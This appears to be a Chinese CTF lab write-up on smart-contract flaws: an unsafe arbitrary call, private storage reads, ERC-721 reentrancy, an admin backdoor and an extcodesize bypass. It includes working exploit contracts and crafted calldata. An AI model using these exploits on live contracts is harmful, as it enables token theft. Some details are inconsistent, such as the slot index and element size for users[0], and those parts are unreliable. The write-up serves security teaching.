---
title: "区块链入门-2"
date: 2026-09-24
categories: ["区块链安全"]
tags: ["区块链安全", "web3分析"]
description: "主要从一个区块链靶场入手（湾区杯赛道一）"
draft: false
---

继续这个主题了，一共48个漏洞，估计会分个三五篇来讲

## （七）不安全的CALL方法/CALL代码注入

### 1、漏洞概况

在以太坊等区块链上，合约之间可以互相调用，用的就是call指令，如果合约 A 写代码时，**调用的目标地址是外部传进来的、没有经过检查**，攻击者可以传一个**恶意合约的地址**进来，合约 A 就会乖乖地去执行那个恶意合约的代码。而`CALL`这个函数本身就很危险，就像一把万能钥匙，能开任何门，但你也可能因此把强盗放进家里。

### 2、代码解析

TokenWhale 是一个简化版 ERC20：部署时给 player（这里是 TokenWhaleContract 自己的地址）1000 个代币。balanceOf 记录每个人有多少币。transfer 从 msg.sender 转币给 to。approveAndCallcode 本来是想：先授权，然后调用 _spender 上的代码，做点额外操作。问题就出在最后这个 approveAndCallcode。

漏洞函数长啥样：

```java
function approveAndCallcode(
    address _spender,
    uint256 _value,
    bytes memory _extraData
) public {
    allowance[msg.sender][_spender] = _value;

    bool success;
    // vulnerable call execute unsafe user code
    (success, ) = _spender.call(_extraData);
    console.log("success:", success);
}
```

调用 `_spender` 这个地址，执行 `_extraData` 里指定的函数，具体调用什么函数、传什么参数，完全由调用者决定。

测试函数 `testUnsafeCall` 里，攻击者 `alice` 做了这么一件事：

```java
vm.prank(alice);
TokenWhaleContract.approveAndCallcode(
    address(TokenWhaleContract),   // _spender = TokenWhale 自己
    0x1337,                        // _value，随便填，不影响
    abi.encodeWithSignature(
        "transfer(address,uint256)",
        address(alice),
        1000
    )
);
```

注意三个参数：

- `_spender` = `Token`
- `WhaleContract` 自己的地址；
- `_value` = `0x1337`，只是写进 `allowance`，对攻击没影响；
- `_extraData` = 编码后的 `transfer(alice, 1000)`。

于是 `approveAndCallcode` 里执行了：

```
_spender.call(_extraData);
```

等价于：

```
TokenWhaleContract.call(
    abi.encodeWithSignature("transfer(address,uint256)", alice, 1000)
);
```

也就是：**让 TokenWhale 合约自己调用自己的 transfer 函数，把 1000 个币转给 alice。**

贴一下完整代码：

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TokenWhale {
    // ========== 状态变量 ==========

    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    // ========== ERC20 标准字段 ==========

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18; // 小数位

    // ========== 部署初始化 ==========

    function TokenWhaleDeploy(address _player) public {
        // 代币总部地址：一般这里不应该设置成可以任意地址
        player = _player;

        // 设置总供应量为 1000
        totalSupply = 1000;

        // 设置部署者的初始余额为 1000
        balanceOf[player] = 1000;
    }

    // ========== 通关检查 ==========

    // 检查部署者的余额是否超过 1,000,000
    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000; // 1 mil
    }

    // ========== 事件定义 ==========

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    // ========== 转账核心逻辑 ==========

    // 内部转账函数：转账核心
    function _transfer(address to, uint256 value) internal {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;

        emit Transfer(msg.sender, to, value);
    }

    // 外部转账函数：可以在转账的基础上增加额外的校验
    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    // ========== ERC20 标准方法 ==========

    // 允许用户批准另一个地址转移一定数量的代币
    // 即允许 spender 地址调用函数调用者（钱包）的代币
    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    // 允许 msg.sender 得到 from 的允许，
    // 从 from 地址转移 value 值的代币到 to 地址上
    //
    // 这是 DEX 交易所里常见的交易方法：
    // 用户 A 委托交易所把自己的代币转到交易所的 DEX 上，
    // msg.sender 和 to 都是 DEX 合约地址
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public {
        require(balanceOf[from] >= value); // 自己的余额大于转账金额
        require(balanceOf[to] + value >= balanceOf[to]); // 目标余额 + 转账金额大于原本余额

        // msg.sender 允许操作 from 的余额的值大于转账金额
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }

    // ========== 漏洞函数 ==========

    // 允许 _spender 能够转移 msg.sender 的代币，
    // 并且允许 _spender 地址执行额外的代码 _extraData
    function approveAndCallcode(
        address _spender,
        uint256 _value,
        bytes memory _extraData
    ) public {
        allowance[msg.sender][_spender] = _value;

        bool success;
        // ⚠️ 漏洞点：执行 _spender 上任意代码，需要进行 ABI 编码
        (success, ) = _spender.call(_extraData);
    }
}
```

正如上面注释所描述的，_extradata参数允许传入任意合约代码，因此该漏洞最 基本的危害是可以进行 dos攻击 可以消耗 目标合约大量的gas，令目标合约上的产生gas不足导致交易失败。

除此之外还可能产生重入攻击或其他危害，取决于业务代码的编写。 例如本案例中的代码就可以通过传入 transfer 方法来让漏洞合约进行转账操作 ，攻击者实现白嫖。

### 3、漏洞复现

还是用回remix复现

（1）deploy合约，选择一个account 1（A地址）作为攻击方

把这个account 1放到`TokenWhaleDeploy` 函数的 `_player`参数，transact

![1791788776115](../../web3/media/1791788776115.png)

能看到本次交易消耗的gas和`balanceOf[player] = 1000`，但是**合约地址本身**的 `balanceOf` 是 0

（`player` → A 地址  ，balanceOf(A)` → 1000 ，balanceOf(C)` → **0**  ，合约自身现在是 0）

（2）让合约自身持有 1000 个代币

漏洞触发时 `transfer` 里的 `msg.sender` 是**合约 C 自己**，所以 C 必须有币

在展开的 **C** 上调用 `transfer`（当前账户仍是 A）：`to`：**C 的合约地址**，`value`：`1000`，点 **Transact**。

![1791788624435](../../web3/media/1791788624435.png)

（3）发起攻击

仍在 **C** 上，找到 `approveAndCallcode`，填入：

| 参数         | 值               |
| ------------ | ---------------- |
| `_spender`   | **C 的合约地址** |
| `_value`     | `1000`           |
| `_extraData` | 见下方           |

`_extraData` 填：

```text
0xa9059cbb0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc400000000000000000000000000000000000000000000000000000000000003e8
```

> 这段就是 `abi.encodeWithSignature("transfer(address,uint256)", A地址, 1000)`，点 **Transact**

![1791788920819](../../web3/media/1791788920819.png)

![1791788969338](../../web3/media/1791788969338.png)

这样之后验证一下：

![1791789025351](../../web3/media/1791789025351.png)

合约里面的钱已经被掏空了，反而A地址却有1000，**合约主动把自身的币转给了攻击者 A。**

## （八）私有数据泄露

### 1、漏洞解析

  原因是链上的所有数据都是公开的，即使设置了某个状态变量为private私有，虽然外部的人员无法直接查看private的内容，但是可能可以通过其他方法读取

### 2、代码解析

代码设置了一个password字段为private，如果 直接 调用我们的确无法得知这个password，但是有其他很多 间接 的方法能够获得这个值

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 该合约我们可以理解成为是一个简单的个人信息管理系统
// slot为状态变量添加的前后顺序添加诸如0,1,2,3..的存储槽
contract Vault {
    uint256 private password;   // slot 0 类似数组[0]，密码明文

    constructor(uint256 _password) {  // 构造方法实例化
        password = _password;  // 设置密码
        User memory user = User({id: 0, password: bytes32(_password)});   // user为[1]
        users.push(user);
        idToUser[0] = user;   // IdTouser 为[2]
    }

    struct User {
        uint id;
        bytes32 password;
    }

    // slot 1，users（动态数组，此槽存数组长度）
    User[] public users;

    // slot 2，idToUser（mapping，此槽为空占位）
    mapping(uint => User) public idToUser;

    // 计算数组中某个元素的位置
    // slot  指要寻找那种类型的数组
    // index 元素的索引
    // elementSize 大小,以字节为单位
    function getArrayLocation(
        uint slot,
        uint index,
        uint elementSize
    ) public pure returns (bytes32) {
        uint256 a = uint(keccak256(abi.encodePacked(slot))) +
            (index * elementSize);
        return bytes32(a);
    }
}
```

### 3、漏洞复现

可以看到由于password 设置了private，因此部署后无法直接查看password

  User memory user = User({id: 0, password: bytes32(_password)});
  idToUser[0] = user

  user和idToUser都是一样的，只不过一个是以数组格式，一个是以映射格式
  可以看到user 的id为0时存储了密码，因此直接读取0位置的值即可

复现时，先随便填一个password

用 `getArrayLocation` 验证 users[0]

调用 `getArrayLocation`：`slot = 1`（users 数组槽），`index = 2`，`elementSize = 1`（User 占 2 个槽）

![1791790078272](../../web3/media/1791790078272.png)

![1791790513131](../../web3/media/1791790513131.png)

### 4、漏洞修复

传入的密码就加密，不给密码明文

## （九）ERC-721中不受保护的callback-潜在的重入攻击

### 1、漏洞概况

 在了解漏洞之前，我们得先看看  ERC721的协议标准。  ERC721是NFT代币的标准协议，该标准有如下这些方法

```java
balanceOf(address owner)  //返回指定地址拥有的代币数量。
ownerOf(uint256 tokenId)  //返回指定代币ID的所有者地址。
safeTransferFrom(address from, address to, uint256 tokenId) //安全地将代币从一个地址转移到另一个地址。
transferFrom(address from, address to, uint256 tokenId)     //将代币从一个地址转移到另一个地址。
approve(address approved, uint256 tokenId)                  //批准另一个地址可以转移特定的代币ID。
getApproved(uint256 tokenId)                                //返回指定代币ID的被批准地址。
setApprovalForAll(address operator, bool approved)          //批准或撤销另一个地址对所有代币的操作权。
isApprovedForAll(address owner, address operator)  //查询某地址是否被批准可以管理另一个地址的所有代币。
```

构成NFT的唯一性的是TokenID，例如元数据扩展tokenURI()就可以返回该代币的详细信息，这个方法可以增强唯一性。

_safemint  函数通常用于安全地铸造 ERC-721 代币，并确保目标地址能够接收代币。如果_safemint 函数的目标是一个合约地址，那么就会调用该合约（目标合约）上的ERC721TokenReceiver 方法。

示例：

```java
pragma solidity ^0.8.0;

interface ERC721TokenReceiver {
    function onERC721Received(
        address operator,  // 发起转账的地址（谁调用了 safeTransferFrom）
        address from,      // 转出方（NFT 原来的持有者）
        uint256 tokenId,   // 被转移的 NFT 编号
        bytes calldata data // 附加数据（safeTransferFrom 的可选参数）
    ) external returns (bytes4);
}
```

  执行顺序：

（1）调用mint方法里调用 _safemint ，发现对方是合约地址

（2）执行 _safemint ，  调用合约地址的 ERC721TokenReceiver方法先执行其中的内容 

（3）mint 方法执行完成

### 2、代码解析

​       攻击者可以通过在攻击合约中实现ERC721TokenReceiver这个回调方法来进行重入攻击， ERC721TokenReceiver是在合约收到NFT的时候需要实现的， 当 ERC-721 代币从一个合约转移到另一个合约时，接收方合约可以通过实现这个接口来处理接收到的代币 。

onERC721能够在接受NFT的时候自动发起调用，从而发生重入攻击。

### 3、漏洞复现

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.9.0/contracts/utils/Address.sol"; //蛮好玩的这两个竟然solidity版本不一样

contract MaxMint721 is ERC721Enumerable {
    uint256 public MAX_PER_USER = 10;   // 定义每个用户最多铸造的NFT个数

    constructor() ERC721("ERC721", "ERC721") {}

    function mint(uint256 amount) external {
        require(
            balanceOf(msg.sender) + amount <= MAX_PER_USER,  // 检测要mint的数量是否小于10
            //_safeMint 内部会调用接收者的 onERC721Received（如果接收者是合约）。而 balanceOf 是在 _safeMint 执行过程中才更新的。如果 msg.sender 是一个恶意合约，它可以在 onERC721Received 回调里再次调用 mint，此时：外层 mint 已经通过了校验（当时 balanceOf 还是旧值），内层 mint 重新做校验时，balanceOf 还没更新（因为 _safeMint 还没执行完）
            "Exceeds maximum per user limit"
        );

        // 执行如下循环，分配n个NFT给msg.sender
        for (uint256 i = 0; i < amount; i++) {
            uint256 mintIndex = totalSupply();   // 返回当前代币的总量，不是最大量
            // _safeMint 是ERC721的一个内部方法
            // function _safeMint(address to, uint256 tokenId)
            // 简单的来说就是给address地址不断新铸造最新的tokenID,
            // 例如amount=3  totalsupply=15  那么mintIndex =16/17/18
            _safeMint(msg.sender, mintIndex);
        }
    }
}
```

合约部署后，可以看到存在多个标准化方法，我们这里只需要关注mint方法

![1791793582336](../../web3/media/1791793582336.png)

  只允许最大铸造10个NFT

EXP脚本，部署时输入MaxMint721的合约地址

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

interface nft721 {
    function mint(uint256 amount) external;
}

contract attack_nft {
    nft721 public nft;
    bool complete;

    constructor(address _address) {
        nft = nft721(_address);
    }

    function mint() public {
        nft.mint(10);
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public returns (bytes4) {
        if (!complete) {
            complete = true;
            nft.mint(9);
        }
        return this.onERC721Received.selector;
    }
}
```

然后直接mint进行攻击就行了

![1791793912856](../../web3/media/1791793912856.png)

这就是攻击成功了，常常一串，在原合约上查`balanceOf`和`totalSupply()`应该都是19

**攻击者先调 mint(10) 通过入口校验，在 _safeMint 触发的 onERC721Received 回调里再调 mint(9)，此时 balanceOf 只增加了 1，1+9<=10 再次通过；等内层结束后，外层循环剩下的 9 次不再校验，最终拿到 19 个 NFT，突破每人 10 个的上限。**

## （十）合约中的隐藏后门

### 1、漏洞解析：
以下合约是利用了汇编指利用sload和store来指定pickwinner的控制，写得还是相对明显，但是只要用户一调用后稍微看下合约代码就能够明白这是一个很明显的后门。

### 2、代码解析：
代码是一个抽奖合约，可以调用pickWinner来指定获奖者，但是这里代码写得太直接了，管理员可以通过内联汇编直接操纵 winner 变量，从而绕过正常的抽奖逻辑，而普通用户调用只会返回空值。

```java
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;

contract LotteryGame {
    // 在智能合约中，每个状态变量都被分配一个存储槽，类似数组0,1,2,3,4 并且按照声明顺序
    uint256 public prize = 1000;       // 奖金1000   [0]
    address public winner;             // [1]
    address public admin = msg.sender; // 管理员设置为合约部署者   [2]

    modifier safeCheck() {
        if (msg.sender == referee()) {  // 校验发送者是否为管理员
            _;
        } else {
            getkWinner();               // 如果发送者不是管理员，就直接返回中奖者地址
        }
    }

    // 加载了admin=msg.sender
    function referee() internal view returns (address user) {
        assembly {
            // load admin value at slot 2 of storage
            user := sload(2)            // 加载[2]的值,并返回
        }
    }

    // 选择胜利者（允许管理者直接设置中奖者地址）
    function pickWinner(address random) public safeCheck {
        assembly {
            // 将中奖者地址存储在[1]中
            // 但是如果不是管理员调用pickWinner,则返回空
            sstore(1, random)
        }
    }

    // 返回中奖者地址
    function getkWinner() public view returns (address) {
        return winner;
    }
}
```

### 3、漏洞复现

部署好后，如果调用者msg.sender不是最初设定的admin值，那么就返回为空

而如果msg.sender 为admin  那么调用者可以任意指定winner，使用了admin钱包调用了pickWinner，指定了自己为winner

![1791794637906](../../web3/media/1791794637906.png)

### 4、漏洞修复

并且怎么说呢 后门安全问题本身不属于漏洞，但是后门的出现可能会出现安全事件（影响普通用户），但是很多合约都需要管理员拥有强权限的设置，因此相关手法也需要了解，到底是业务所需，还是开发者恶意制作。

可以查看知道创宇所写的文章《 智能合约中的那些后门漏洞  》
https://mp.weixin.qq.com/s/kOKEZCROYmkpYuUjswNnHQ

## （十一）合约检测绕过

### 1、漏洞解析：

      部分合约代码为了防止被恶意的合约调用，因此加入了对调用地址的限制，如果禁止合约代码调用的话，即使目标合约本身存在漏洞，也无法编写恶意合约来利用。

      检测是否为合约调用的方法是extcodesize，它检测地址的返回值是否大于0，如果地址的返回值为0，则为EOA账户。

      但是攻击者也很聪明，攻击者构造的恶意合约里只有一个构造函数，这样构造函数在  部署的时候就执行目标合约里的代码，并且此时代码大小依旧为0，我们所有的恶意操作在构造函数里执行。

### 2、代码解析：

  通过传入一个地址，来判断是否为合约地址，如果是合约地址就能修改Pwned来判断是否漏洞利用成功

```java
// 对合约有一个基本判断，逻辑上来看只有EOA钱包调用才能修改pwned的值
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Target {
    // 判断地址是否为合约地址
    function isContract(address account) public view returns (bool) {
        uint size;
        // extcodesize 获取地址上的的代码大小
        assembly {
            size := extcodesize(account)
        }
        // 如果代码大小>0 就是合约地址
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        // 如果是合约代码，那么!true,则不执行
        // 如果是EOA地址，那么!false,则为真，执行pwned=true
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}
```

```java
//  漏洞利用代码，如下图所示，只需在部署的时候指向对方的合约地址即可
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface iscontract {
    function protected() external;
}

contract Attack2 {
    iscontract public iscontract_attack;

    constructor(address attack_address) {
        iscontract_attack = iscontract(attack_address);
        iscontract_attack.protected();
    }

    // ....其他合约方法可以正常写（攻击调用）
    // 因为此时protected已经被调用了,只需要把bypass的地方放到构造方法即可
}
```



